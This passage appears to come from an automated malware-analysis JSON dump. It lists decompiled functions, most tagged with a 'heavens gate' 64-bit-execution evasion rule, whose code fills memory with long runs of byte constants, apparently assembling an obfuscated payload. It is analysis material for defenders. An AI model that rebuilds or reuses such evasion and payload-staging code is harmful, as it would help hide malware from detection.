\"Diaz\";\n    uStack396 = CONCAT31(uStack396._1_3_, 0x62);\n    fcn.00401cd0();\n    uStack400 = 99;\n    fcn.00401cd0(\"Hayes\");\n    uStack404 = 100;\n    do {\n        iVar2 = fcn.0041aefd();\n        iVar2 = iVar2 % 100;\n    } while (iVar2 == *0x4430b0);\n    *0x4430b0 = iVar2;\n    iVar2 = fcn.004013a0(*(&stack0xfffffcd4 + iVar2 * 4) + -0x10);\n    piVar1 = uStack396;\n    *uStack396 = iVar2 + 0x10;\n    uStack404 = uStack404 & 0xffffff00;\n    fcn.0041b954(&stack0xfffffcd4, 4, 100, fcn.00401420);\n    *in_FS_OFFSET = pcStack428;\n    return piVar1;\n}\n",
        "token_count": 5566
    },
    "00404df0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.00404df0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404b50(param_1);\n    *0x4451b8 = 2;\n    *0x4451b9 = 0x31;\n    *0x4451ba = 0x1e;\n    *0x4451bb = 0x96;\n    *0x4451bc = 0x61;\n    *0x4451bd = 0x59;\n    *0x4451be = 5;\n    *0x4451bf = 0x31;\n    *0x4451c0 = 0x17;\n    *0x4451c1 = 0x1d;\n    *0x4451c2 = 0x33;\n    *0x4451c3 = 0x4b;\n    *0x4451c4 = 0x8f;\n    *0x4451c5 = 0x39;\n    *0x4451c6 = 0x3a;\n    *0x4451c7 = 0x1a;\n    *0x4451c8 = 0xa6;\n    *0x4451c9 = 0x7b;\n    *0x4451ca = 0x65;\n    *0x4451cb = 0x26;\n    *0x4451cc = 0x30;\n    *0x4451cd = 0x46;\n    *0x4451ce = 0x2d;\n    *0x4451cf = 0xcd;\n    *0x4451d0 = 0x72;\n    *0x4451d1 = 0x13;\n    *0x4451d2 = 0xc5;\n    *0x4451d3 = 0xbf;\n    *0x4451d4 = 0xa5;\n    *0x4451d5 = 0xeb;\n    *0x4451d6 = 0x8f;\n    *0x4451d7 = 0x83;\n    *0x4451d8 = 0x7a;\n    *0x4451d9 = 0xee;\n    *0x4451da = 0xa4;\n    *0x4451db = 0xf1;\n    *0x4451dc = 0x90;\n    *0x4451dd = 0xd0;\n    *0x4451de = 0x4f;\n    *0x4451df = 0xb6;\n    *0x4451e0 = 0;\n    *0x4451e1 = 0x56;\n    *0x4451e2 = 0x93;\n    *0x4451e3 = 0xd3;\n    *0x4451e4 = 0xd2;\n    *0x4451e5 = 0xdd;\n    *0x4451e6 = 0xa1;\n    *0x445e08 = 0x49;\n    *0x445e09 = 0x76;\n    *0x445e0a = 0x6e;\n    *0x445e0b = 9;\n    *0x445e0c = 0xf4;\n    *0x445e0d = 0xfe;\n    *0x445e0e = 0xb9;\n    *0x445e0f = 0x42;\n    *0x445e10 = 0x2d;\n    *0x445e11 = 0xe5;\n    *0x445e12 = 6;\n    *0x445e13 = 0x71;\n    *0x445e14 = 0x35;\n    *0x445e15 = 0x7b;\n    *0x445e16 = 0x18;\n    *0x445e17 = 0x77;\n    *0x445e18 = 0xf1;\n    *0x445e19 = 0xd1;\n    *0x445e1a = 0x97;\n    *0x445e1b = 0x39;\n    *0x445e1c = 0x6b;\n    *0x445e1d = 0x3e;\n    *0x445e1e = 0x8e;\n    *0x445e1f = 0x1e;\n    *0x445e20 = 0x51;\n    *0x445e21 = 0xdc;\n    *0x445e22 = 0xed;\n    *0x445e23 = 0x94;\n    *0x445e24 = 0x75;\n    *0x445e25 = 0xc;\n    *0x445e26 = 8;\n    *0x445e27 = 0x8b;\n    *0x445e28 = 0x4b;\n    *0x445e29 = 0xee;\n    *0x445e2a = 0x16;\n    *0x445e2b = 0xf8;\n    *0x445e2c = 0x6e;\n    *0x445e2d = 0xea;\n    *0x445e2e = 0xb4;\n    *0x445e2f = 0x53;\n    *0x445e30 = 0x1b;\n    *0x445e31 = 0x2a;\n    *0x445e32 = 0x60;\n    *0x445e33 = 0x1a;\n    *0x445e34 = 0xb5;\n    *0x445e35 = 0x1d;\n    *0x445e36 = 0xfe;\n    return param_1 + iVar1 + 0x129ea6;\n}\n",
        "token_count": 1329
    },
    "00405e10": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.00405e10(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405b60(param_1);\n    *0x4452d2 = 0x2b;\n    *0x4452d3 = 0xa8;\n    *0x4452d4 = 0xa5;\n    *0x4452d5 = 0x3b;\n    *0x4452d6 = 0x2a;\n    *0x4452d7 = 0x4b;\n    *0x4452d8 = 0x53;\n    *0x4452d9 = 0xe1;\n    *0x4452da = 0xfc;\n    *0x4452db = 0x60;\n    *0x4452dc = 0x4b;\n    *0x4452dd = 0xae;\n    *0x4452de = 0xee;\n    *0x4452df = 0x94;\n    *0x4452e0 = 0xa3;\n    *0x4452e1 = 0x68;\n    *0x4452e2 = 0xfe;\n    *0x4452e3 = 0xe9;\n    *0x4452e4 = 0x67;\n    *0x4452e5 = 0x6a;\n    *0x4452e6 = 0x62;\n    *0x4452e7 = 0x33;\n    *0x4452e8 = 0x13;\n    *0x4452e9 = 0x24;\n    *0x4452ea = 1;\n    *0x4452eb = 0x9b;\n    *0x4452ec = 0x1a;\n    *0x4452ed = 0x98;\n    *0x4452ee = 0xf7;\n    *0x4452ef = 0x1f;\n    *0x4452f0 = 0x62;\n    *0x4452f1 = 0xde;\n    *0x4452f2 = 0x15;\n    *0x4452f3 = 0x10;\n    *0x4452f4 = 0xc5;\n    *0x4452f5 = 0xa1;\n    *0x4452f6 = 0x5f;\n    *0x4452f7 = 0x93;\n    *0x4452f8 = 0x92;\n    *0x4452f9 = 0xa0;\n    *0x4452fa = 0x8d;\n    *0x4452fb = 0x21;\n    *0x4452fc = 10;\n    *0x4452fd = 0x2e;\n    *0x4452fe = 0x8b;\n    *0x4452ff = 7;\n    *0x445300 = 0xe3;\n    *0x445f22 = 0x82;\n    *0x445f23 = 0xe1;\n    *0x445f24 = 0xbd;\n    *0x445f25 = 0xa5;\n    *0x445f26 = 0xfd;\n    *0x445f27 = 0x3b;\n    *0x445f28 = 7;\n    *0x445f29 = 0x9d;\n    *0x445f2a = 0xd4;\n    *0x445f2b = 0xb2;\n    *0x445f2c = 0x87;\n    *0x445f2d = 0xd8;\n    *0x445f2e = 0xa2;\n    *0x445f2f = 0xbf;\n    *0x445f30 = 0x78;\n    *0x445f31 = 0x7e;\n    *0x445f32 = 0xe6;\n    *0x445f33 = 0xe0;\n    *0x445f34 = 0x3e;\n    *0x445f35 = 0xff;\n    *0x445f36 = 0x84;\n    *0x445f37 = 0x15;\n    *0x445f38 = 0xdd;\n    *0x445f39 = 0x8e;\n    *0x445f3a = 0x44;\n    *0x445f3b = 0x62;\n    *0x445f3c = 0x7f;\n    *0x445f3d = 0xa1;\n    *0x445f3e = 0x51;\n    *0x445f3f = 0x50;\n    *0x445f40 = 0xf2;\n    *0x445f41 = 0x73;\n    *0x445f42 = 0xbc;\n    *0x445f43 = 0x6b;\n    *0x445f44 = 0x27;\n    *0x445f45 = 0x82;\n    *0x445f46 = 0xf7;\n    *0x445f47 = 0xc5;\n    *0x445f48 = 0xb4;\n    *0x445f49 = 0x12;\n    *0x445f4a = 0x5b;\n    *0x445f4b = 0x71;\n    *0x445f4c = 0x53;\n    *0x445f4d = 0xa7;\n    *0x445f4e = 0xa2;\n    *0x445f4f = 9;\n    *0x445f50 = 0x61;\n    return param_1 + iVar1 + 0x131377;\n}\n",
        "token_count": 1325
    },
    "004060b0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.004060b0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405e10(param_1);\n    *0x445301 = 0xb2;\n    *0x445302 = 0xf9;\n    *0x445303 = 0xe6;\n    *0x445304 = 0xc9;\n    *0x445305 = 0x28;\n    *0x445306 = 0xab;\n    *0x445307 = 0x34;\n    *0x445308 = 0xd8;\n    *0x445309 = 0x9e;\n    *0x44530a = 0x2a;\n    *0x44530b = 0xb9;\n    *0x44530c = 0x23;\n    *0x44530d = 0xb8;\n    *0x44530e = 0x31;\n    *0x44530f = 0x13;\n    *0x445310 = 0x30;\n    *0x445311 = 0x2d;\n    *0x445312 = 0x31;\n    *0x445313 = 0x33;\n    *0x445314 = 0x7a;\n    *0x445315 = 0x47;\n    *0x445316 = 0xce;\n    *0x445317 = 0xde;\n    *0x445318 = 0xee;\n    *0x445319 = 0x66;\n    *0x44531a = 0x5f;\n    *0x44531b = 0x2d;\n    *0x44531c = 0x6e;\n    *0x44531d = 0x7e;\n    *0x44531e = 0x72;\n    *0x44531f = 0xd;\n    *0x445320 = 0x51;\n    *0x445321 = 0x94;\n    *0x445322 = 0x45;\n    *0x445323 = 0xbf;\n    *0x445324 = 0xe0;\n    *0x445325 = 0x46;\n    *0x445326 = 0x4e;\n    *0x445327 = 0x58;\n    *0x445328 = 0xdb;\n    *0x445329 = 0x40;\n    *0x44532a = 0xb4;\n    *0x44532b = 0x43;\n    *0x44532c = 0xf2;\n    *0x44532d = 199;\n    *0x44532e = 0xd4;\n    *0x44532f = 0xbb;\n    *0x445f51 = 0x8f;\n    *0x445f52 = 0x6d;\n    *0x445f53 = 0x29;\n    *0x445f54 = 0x60;\n    *0x445f55 = 0x56;\n    *0x445f56 = 0xc0;\n    *0x445f57 = 0xf2;\n    *0x445f58 = 0x76;\n    *0x445f59 = 0x4f;\n    *0x445f5a = 0x81;\n    *0x445f5b = 0x88;\n    *0x445f5c = 0xeb;\n    *0x445f5d = 0x12;\n    *0x445f5e = 0xfc;\n    *0x445f5f = 0x94;\n    *0x445f60 = 0xaf;\n    *0x445f61 = 0xf9;\n    *0x445f62 = 0x62;\n    *0x445f63 = 0xc3;\n    *0x445f64 = 0xd1;\n    *0x445f65 = 0xa2;\n    *0x445f66 = 0x45;\n    *0x445f67 = 0x45;\n    *0x445f68 = 9;\n    *0x445f69 = 0x70;\n    *0x445f6a = 0x1e;\n    *0x445f6b = 0x4f;\n    *0x445f6c = 0x2f;\n    *0x445f6d = 10;\n    *0x445f6e = 199;\n    *0x445f6f = 0x99;\n    *0x445f70 = 0xc2;\n    *0x445f71 = 0xda;\n    *0x445f72 = 2;\n    *0x445f73 = 0xe0;\n    *0x445f74 = 99;\n    *0x445f75 = 0x8e;\n    *0x445f76 = 0xf0;\n    *0x445f77 = 0x65;\n    *0x445f78 = 0x57;\n    *0x445f79 = 0x9b;\n    *0x445f7a = 0x9a;\n    *0x445f7b = 0x6d;\n    *0x445f7c = 8;\n    *0x445f7d = 0xb6;\n    *0x445f7e = 0x6c;\n    *0x445f7f = 0xbf;\n    return param_1 + iVar1 + 0x152d1b;\n}\n",
        "token_count": 1264
    },
    "004068c0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.004068c0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406610(param_1);\n    *0x44538e = 0xb6;\n    *0x44538f = 100;\n    *0x445390 = 0xf0;\n    *0x445391 = 0xf;\n    *0x445392 = 0x8c;\n    *0x445393 = 0xf;\n    *0x445394 = 0x22;\n    *0x445395 = 0x57;\n    *0x445396 = 0xc3;\n    *0x445397 = 0x2a;\n    *0x445398 = 0x82;\n    *0x445399 = 200;\n    *0x44539a = 0x33;\n    *0x44539b = 0x4c;\n    *0x44539c = 0x73;\n    *0x44539d = 0xd5;\n    *0x44539e = 0xe9;\n    *0x44539f = 0xe4;\n    *0x4453a0 = 0xcb;\n    *0x4453a1 = 5;\n    *0x4453a2 = 0xa3;\n    *0x4453a3 = 0xb2;\n    *0x4453a4 = 0x53;\n    *0x4453a5 = 0x74;\n    *0x4453a6 = 0x56;\n    *0x4453a7 = 0x4b;\n    *0x4453a8 = 0x4a;\n    *0x4453a9 = 0x50;\n    *0x4453aa = 0xab;\n    *0x4453ab = 0x99;\n    *0x4453ac = 0xe2;\n    *0x4453ad = 0x5d;\n    *0x4453ae = 0x7e;\n    *0x4453af = 0x58;\n    *0x4453b0 = 0xc1;\n    *0x4453b1 = 0x71;\n    *0x4453b2 = 0x5e;\n    *0x4453b3 = 0x9b;\n    *0x4453b4 = 0x81;\n    *0x4453b5 = 0xf9;\n    *0x4453b6 = 0x10;\n    *0x4453b7 = 0x45;\n    *0x4453b8 = 0x30;\n    *0x4453b9 = 0x72;\n    *0x4453ba = 0xc;\n    *0x4453bb = 0x90;\n    *0x4453bc = 0xd2;\n    *0x445fde = 0xd3;\n    *0x445fdf = 0x26;\n    *0x445fe0 = 0x15;\n    *0x445fe1 = 0x16;\n    *0x445fe2 = 0x35;\n    *0x445fe3 = 0x32;\n    *0x445fe4 = 0xfd;\n    *0x445fe5 = 0xb7;\n    *0x445fe6 = 200;\n    *0x445fe7 = 0xe5;\n    *0x445fe8 = 0xef;\n    *0x445fe9 = 0x10;\n    *0x445fea = 0x85;\n    *0x445feb = 0xf4;\n    *0x445fec = 0x44;\n    *0x445fed = 0x49;\n    *0x445fee = 0xc6;\n    *0x445fef = 0x97;\n    *0x445ff0 = 0xf9;\n    *0x445ff1 = 0x4c;\n    *0x445ff2 = 0xcd;\n    *0x445ff3 = 0xc;\n    *0x445ff4 = 0x2f;\n    *0x445ff5 = 0x48;\n    *0x445ff6 = 0x3b;\n    *0x445ff7 = 0x12;\n    *0x445ff8 = 0xad;\n    *0x445ff9 = 0x2f;\n    *0x445ffa = 0x99;\n    *0x445ffb = 0x6e;\n    *0x445ffc = 0x5d;\n    *0x445ffd = 0x39;\n    *0x445ffe = 0xd3;\n    *0x445fff = 0x6a;\n    *0x446000 = 0xcb;\n    *0x446001 = 0x60;\n    *0x446002 = 0xb8;\n    *0x446003 = 0x51;\n    *0x446004 = 0xa9;\n    *0x446005 = 0xe1;\n    *0x446006 = 0x7b;\n    *0x446007 = 0xf4;\n    *0x446008 = 0x4d;\n    *0x446009 = 0xc1;\n    *0x44600a = 0x35;\n    *0x44600b = 0x29;\n    *0x44600c = 0x31;\n    return param_1 + iVar1 + 0x13a1d7;\n}\n",
        "token_count": 1268
    },
    "00406e10": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.00406e10(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406b60(param_1);\n    *0x4453ec = 0xf9;\n    *0x4453ed = 0xc3;\n    *0x4453ee = 0x4a;\n    *0x4453ef = 0x5b;\n    *0x4453f0 = 0x4a;\n    *0x4453f1 = 0x5c;\n    *0x4453f2 = 0x56;\n    *0x4453f3 = 0xa3;\n    *0x4453f4 = 0xbf;\n    *0x4453f5 = 0xbb;\n    *0x4453f6 = 0x15;\n    *0x4453f7 = 0x45;\n    *0x4453f8 = 0xa5;\n    *0x4453f9 = 0x9d;\n    *0x4453fa = 0x40;\n    *0x4453fb = 0xba;\n    *0x4453fc = 0x3e;\n    *0x4453fd = 0x56;\n    *0x4453fe = 0xc3;\n    *0x4453ff = 0x4f;\n    *0x445400 = 0x41;\n    *0x445401 = 0x4e;\n    *0x445402 = 0x3e;\n    *0x445403 = 0xa6;\n    *0x445404 = 0x58;\n    *0x445405 = 0x7f;\n    *0x445406 = 0x86;\n    *0x445407 = 0x33;\n    *0x445408 = 0xa0;\n    *0x445409 = 0xf8;\n    *0x44540a = 0x22;\n    *0x44540b = 0xc0;\n    *0x44540c = 0x2d;\n    *0x44540d = 0x5d;\n    *0x44540e = 0xce;\n    *0x44540f = 0xe9;\n    *0x445410 = 0x83;\n    *0x445411 = 0x65;\n    *0x445412 = 0xfb;\n    *0x445413 = 0xa0;\n    *0x445414 = 0x1e;\n    *0x445415 = 0x5a;\n    *0x445416 = 0x4d;\n    *0x445417 = 0xaa;\n    *0x445418 = 0xeb;\n    *0x445419 = 0x9d;\n    *0x44541a = 0x1c;\n    *0x44603c = 0x29;\n    *0x44603d = 0xa8;\n    *0x44603e = 0x20;\n    *0x44603f = 0xa5;\n    *0x446040 = 0x80;\n    *0x446041 = 0x80;\n    *0x446042 = 0xc3;\n    *0x446043 = 0xba;\n    *0x446044 = 0x81;\n    *0x446045 = 0xbe;\n    *0x446046 = 0x9f;\n    *0x446047 = 0xb6;\n    *0x446048 = 0xc3;\n    *0x446049 = 0xa3;\n    *0x44604a = 10;\n    *0x44604b = 0xad;\n    *0x44604c = 0xfe;\n    *0x44604d = 0xb7;\n    *0x44604e = 0xc2;\n    *0x44604f = 0x37;\n    *0x446050 = 0x90;\n    *0x446051 = 0x45;\n    *0x446052 = 0x66;\n    *0x446053 = 0xf2;\n    *0x446054 = 0xfb;\n    *0x446055 = 0xda;\n    *0x446056 = 0xf8;\n    *0x446057 = 0xfd;\n    *0x446058 = 0x65;\n    *0x446059 = 0xca;\n    *0x44605a = 0x61;\n    *0x44605b = 0x7d;\n    *0x44605c = 0x17;\n    *0x44605d = 0xab;\n    *0x44605e = 0xed;\n    *0x44605f = 0x1b;\n    *0x446060 = 0xfe;\n    *0x446061 = 0xd8;\n    *0x446062 = 0xcb;\n    *0x446063 = 0x84;\n    *0x446064 = 0x2d;\n    *0x446065 = 0xef;\n    *0x446066 = 0x8f;\n    *0x446067 = 0xe9;\n    *0x446068 = 0x59;\n    *0x446069 = 0x54;\n    *0x44606a = 0xaf;\n    return param_1 + iVar1 + 0x1248be;\n}\n",
        "token_count": 1240
    },
    "004070b0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.004070b0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406e10(param_1);\n    *0x44541b = 0x20;\n    *0x44541c = 0xcc;\n    *0x44541d = 0x20;\n    *0x44541e = 0xf4;\n    *0x44541f = 0xef;\n    *0x445420 = 0x18;\n    *0x445421 = 0xea;\n    *0x445422 = 0x15;\n    *0x445423 = 0x59;\n    *0x445424 = 0x19;\n    *0x445425 = 0x96;\n    *0x445426 = 0xf3;\n    *0x445427 = 0x72;\n    *0x445428 = 0x8d;\n    *0x445429 = 0xd4;\n    *0x44542a = 0xb6;\n    *0x44542b = 0xa3;\n    *0x44542c = 0x25;\n    *0x44542d = 0xe6;\n    *0x44542e = 0xbb;\n    *0x44542f = 0x2a;\n    *0x445430 = 9;\n    *0x445431 = 0x24;\n    *0x445432 = 0x12;\n    *0x445433 = 0x98;\n    *0x445434 = 0x52;\n    *0x445435 = 0x7a;\n    *0x445436 = 0xff;\n    *0x445437 = 0x52;\n    *0x445438 = 0x8e;\n    *0x445439 = 0xe5;\n    *0x44543a = 0x79;\n    *0x44543b = 0x11;\n    *0x44543c = 0x40;\n    *0x44543d = 0xf9;\n    *0x44543e = 0xae;\n    *0x44543f = 0x62;\n    *0x445440 = 0x5d;\n    *0x445441 = 0x5d;\n    *0x445442 = 0x7c;\n    *0x445443 = 0x27;\n    *0x445444 = 0xd0;\n    *0x445445 = 0x4d;\n    *0x445446 = 0xf9;\n    *0x445447 = 0x13;\n    *0x445448 = 0xf7;\n    *0x445449 = 0x17;\n    *0x44606b = 0x7d;\n    *0x44606c = 0x5c;\n    *0x44606d = 0xac;\n    *0x44606e = 9;\n    *0x44606f = 0xf9;\n    *0x446070 = 0xb3;\n    *0x446071 = 0x62;\n    *0x446072 = 0x5c;\n    *0x446073 = 0x1b;\n    *0x446074 = 0;\n    *0x446075 = 0x25;\n    *0x446076 = 0xca;\n    *0x446077 = 0x22;\n    *0x446078 = 0x88;\n    *0x446079 = 0x68;\n    *0x44607a = 0x5d;\n    *0x44607b = 0x54;\n    *0x44607c = 0xb5;\n    *0x44607d = 0xe0;\n    *0x44607e = 0x7e;\n    *0x44607f = 0x78;\n    *0x446080 = 0x96;\n    *0x446081 = 10;\n    *0x446082 = 0x7f;\n    *0x446083 = 0x5d;\n    *0x446084 = 0x5a;\n    *0x446085 = 0xa3;\n    *0x446086 = 0x13;\n    *0x446087 = 0x51;\n    *0x446088 = 0xd9;\n    *0x446089 = 0x2e;\n    *0x44608a = 0xd1;\n    *0x44608b = 0xaa;\n    *0x44608c = 0xb;\n    *0x44608d = 0x72;\n    *0x44608e = 0xb5;\n    *0x44608f = 0x41;\n    *0x446090 = 0x8e;\n    *0x446091 = 0xf9;\n    *0x446092 = 0x9e;\n    *0x446093 = 0xf2;\n    *0x446094 = 0x25;\n    *0x446095 = 0x92;\n    *0x446096 = 0xd1;\n    *0x446097 = 0x1e;\n    *0x446098 = 0x33;\n    *0x446099 = 0xcf;\n    return param_1 + iVar1 + 0x13e7eb;\n}\n",
        "token_count": 1224
    },
    "00407610": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.00407610(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407360(param_1);\n    *0x445479 = 0x49;\n    *0x44547a = 0xb7;\n    *0x44547b = 0x95;\n    *0x44547c = 0xd6;\n    *0x44547d = 0xd8;\n    *0x44547e = 0xbd;\n    *0x44547f = 0xc2;\n    *0x445480 = 0x2e;\n    *0x445481 = 0xc9;\n    *0x445482 = 0xff;\n    *0x445483 = 0x14;\n    *0x445484 = 0x1d;\n    *0x445485 = 0x98;\n    *0x445486 = 0xd1;\n    *0x445487 = 0x81;\n    *0x445488 = 0x42;\n    *0x445489 = 0xd3;\n    *0x44548a = 0x3c;\n    *0x44548b = 0x51;\n    *0x44548c = 0x2f;\n    *0x44548d = 0x9e;\n    *0x44548e = 0x7b;\n    *0x44548f = 0xa2;\n    *0x445490 = 0xea;\n    *0x445491 = 0x2f;\n    *0x445492 = 0x7e;\n    *0x445493 = 0xe4;\n    *0x445494 = 0x6e;\n    *0x445495 = 0x52;\n    *0x445496 = 0x6b;\n    *0x445497 = 0x5e;\n    *0x445498 = 0x27;\n    *0x445499 = 0xe6;\n    *0x44549a = 0x18;\n    *0x44549b = 0xa8;\n    *0x44549c = 0x7a;\n    *0x44549d = 0x5f;\n    *0x44549e = 0x93;\n    *0x44549f = 0x2e;\n    *0x4454a0 = 0x3a;\n    *0x4454a1 = 0x42;\n    *0x4454a2 = 0x9a;\n    *0x4454a3 = 0xb4;\n    *0x4454a4 = 0x34;\n    *0x4454a5 = 0xac;\n    *0x4454a6 = 0x23;\n    *0x4454a7 = 0xcc;\n    *0x4460c9 = 0x62;\n    *0x4460ca = 0x88;\n    *0x4460cb = 0x21;\n    *0x4460cc = 0x59;\n    *0x4460cd = 0x75;\n    *0x4460ce = 0x38;\n    *0x4460cf = 100;\n    *0x4460d0 = 0x6d;\n    *0x4460d1 = 0x96;\n    *0x4460d2 = 8;\n    *0x4460d3 = 0xac;\n    *0x4460d4 = 0xcf;\n    *0x4460d5 = 0xd3;\n    *0x4460d6 = 0x7a;\n    *0x4460d7 = 0x98;\n    *0x4460d8 = 0x23;\n    *0x4460d9 = 0xfe;\n    *0x4460da = 0xf8;\n    *0x4460db = 0xcd;\n    *0x4460dc = 0x33;\n    *0x4460dd = 0x2e;\n    *0x4460de = 0x4c;\n    *0x4460df = 0x75;\n    *0x4460e0 = 0x6c;\n    *0x4460e1 = 0x3e;\n    *0x4460e2 = 0x26;\n    *0x4460e3 = 0xbb;\n    *0x4460e4 = 0x62;\n    *0x4460e5 = 0x4c;\n    *0x4460e6 = 0x99;\n    *0x4460e7 = 0x50;\n    *0x4460e8 = 0x48;\n    *0x4460e9 = 0x3c;\n    *0x4460ea = 0x9e;\n    *0x4460eb = 0xea;\n    *0x4460ec = 0x78;\n    *0x4460ed = 0x33;\n    *0x4460ee = 0x90;\n    *0x4460ef = 0xbf;\n    *0x4460f0 = 0xf1;\n    *0x4460f1 = 0x1c;\n    *0x4460f2 = 0xaf;\n    *0x4460f3 = 0xe;\n    *0x4460f4 = 0xd4;\n    *0x4460f5 = 0x26;\n    *0x4460f6 = 0x9d;\n    *0x4460f7 = 0x96;\n    return param_1 + iVar1 + 0x12e753;\n}\n",
        "token_count": 1304
    },
    "004078c0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.004078c0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407610(param_1);\n    *0x4454a8 = 0xa4;\n    *0x4454a9 = 0xcc;\n    *0x4454aa = 0xd5;\n    *0x4454ab = 0x61;\n    *0x4454ac = 0xbd;\n    *0x4454ad = 100;\n    *0x4454ae = 0x8d;\n    *0x4454af = 0x30;\n    *0x4454b0 = 0x25;\n    *0x4454b1 = 0x4c;\n    *0x4454b2 = 0xda;\n    *0x4454b3 = 0x4a;\n    *0x4454b4 = 0x77;\n    *0x4454b5 = 0xee;\n    *0x4454b6 = 0x81;\n    *0x4454b7 = 0x93;\n    *0x4454b8 = 0xc0;\n    *0x4454b9 = 0xcb;\n    *0x4454ba = 0xfa;\n    *0x4454bb = 0x46;\n    *0x4454bc = 2;\n    *0x4454bd = 0xf5;\n    *0x4454be = 0xf2;\n    *0x4454bf = 0x6e;\n    *0x4454c0 = 0xb4;\n    *0x4454c1 = 0x93;\n    *0x4454c2 = 199;\n    *0x4454c3 = 0x6e;\n    *0x4454c4 = 0x3f;\n    *0x4454c5 = 0x60;\n    *0x4454c6 = 0xe;\n    *0x4454c7 = 0x7b;\n    *0x4454c8 = 0x83;\n    *0x4454c9 = 0x2c;\n    *0x4454ca = 0x10;\n    *0x4454cb = 0x1d;\n    *0x4454cc = 0x50;\n    *0x4454cd = 0x59;\n    *0x4454ce = 0x48;\n    *0x4454cf = 0xb2;\n    *0x4454d0 = 0xee;\n    *0x4454d1 = 0x60;\n    *0x4454d2 = 0xe7;\n    *0x4454d3 = 0xea;\n    *0x4454d4 = 0x95;\n    *0x4454d5 = 0x4a;\n    *0x4454d6 = 0x51;\n    *0x4460f8 = 0xe7;\n    *0x4460f9 = 0x44;\n    *0x4460fa = 0xe4;\n    *0x4460fb = 0x1d;\n    *0x4460fc = 0x12;\n    *0x4460fd = 0xac;\n    *0x4460fe = 0x6e;\n    *0x4460ff = 0xeb;\n    *0x446100 = 0xe5;\n    *0x446101 = 0x59;\n    *0x446102 = 0xb;\n    *0x446103 = 0x4c;\n    *0x446104 = 0xf;\n    *0x446105 = 0x89;\n    *0x446106 = 0xef;\n    *0x446107 = 0x12;\n    *0x446108 = 0xe8;\n    *0x446109 = 0x3f;\n    *0x44610a = 0x31;\n    *0x44610b = 0x10;\n    *0x44610c = 0xe8;\n    *0x44610d = 0xc2;\n    *0x44610e = 0x4d;\n    *0x44610f = 0xa0;\n    *0x446110 = 0x2e;\n    *0x446111 = 0x1c;\n    *0x446112 = 0xa2;\n    *0x446113 = 0x1e;\n    *0x446114 = 0xfa;\n    *0x446115 = 0x9c;\n    *0x446116 = 0xf5;\n    *0x446117 = 0x6b;\n    *0x446118 = 0x33;\n    *0x446119 = 0x55;\n    *0x44611a = 0xec;\n    *0x44611b = 0x6b;\n    *0x44611c = 0xe2;\n    *0x44611d = 0x9c;\n    *0x44611e = 0x94;\n    *0x44611f = 0x87;\n    *0x446120 = 0xb5;\n    *0x446121 = 0x8e;\n    *0x446122 = 0xdc;\n    *0x446123 = 0x2c;\n    *0x446124 = 0x7d;\n    *0x446125 = 0x88;\n    *0x446126 = 0x18;\n    return param_1 + iVar1 + 0x14893d;\n}\n",
        "token_count": 1286
    },
    "00407b70": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.00407b70(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004078c0(param_1);\n    *0x4454d7 = 0x4c;\n    *0x4454d8 = 0xf5;\n    *0x4454d9 = 0x37;\n    *0x4454da = 0x9e;\n    *0x4454db = 0xaf;\n    *0x4454dc = 0xb0;\n    *0x4454dd = 0xda;\n    *0x4454de = 0x1a;\n    *0x4454df = 0xc2;\n    *0x4454e0 = 0xdb;\n    *0x4454e1 = 0xfa;\n    *0x4454e2 = 0xc5;\n    *0x4454e3 = 0x85;\n    *0x4454e4 = 0x80;\n    *0x4454e5 = 0xf3;\n    *0x4454e6 = 0xd3;\n    *0x4454e7 = 0xcd;\n    *0x4454e8 = 0x1f;\n    *0x4454e9 = 0x33;\n    *0x4454ea = 0x2c;\n    *0x4454eb = 0xc4;\n    *0x4454ec = 0x28;\n    *0x4454ed = 0xbe;\n    *0x4454ee = 0xed;\n    *0x4454ef = 0x66;\n    *0x4454f0 = 0x83;\n    *0x4454f1 = 0xab;\n    *0x4454f2 = 0xe6;\n    *0x4454f3 = 6;\n    *0x4454f4 = 9;\n    *0x4454f5 = 0xa4;\n    *0x4454f6 = 0x1a;\n    *0x4454f7 = 199;\n    *0x4454f8 = 8;\n    *0x4454f9 = 0x6a;\n    *0x4454fa = 0x43;\n    *0x4454fb = 0x24;\n    *0x4454fc = 0xc3;\n    *0x4454fd = 0x4e;\n    *0x4454fe = 0x4b;\n    *0x4454ff = 0x68;\n    *0x445500 = 0xef;\n    *0x445501 = 0xb9;\n    *0x445502 = 0xd4;\n    *0x445503 = 0x36;\n    *0x445504 = 0x37;\n    *0x445505 = 0xa5;\n    *0x446127 = 0x4a;\n    *0x446128 = 0xb0;\n    *0x446129 = 0xad;\n    *0x44612a = 0x7f;\n    *0x44612b = 0xd5;\n    *0x44612c = 0xe8;\n    *0x44612d = 100;\n    *0x44612e = 0xad;\n    *0x44612f = 0x48;\n    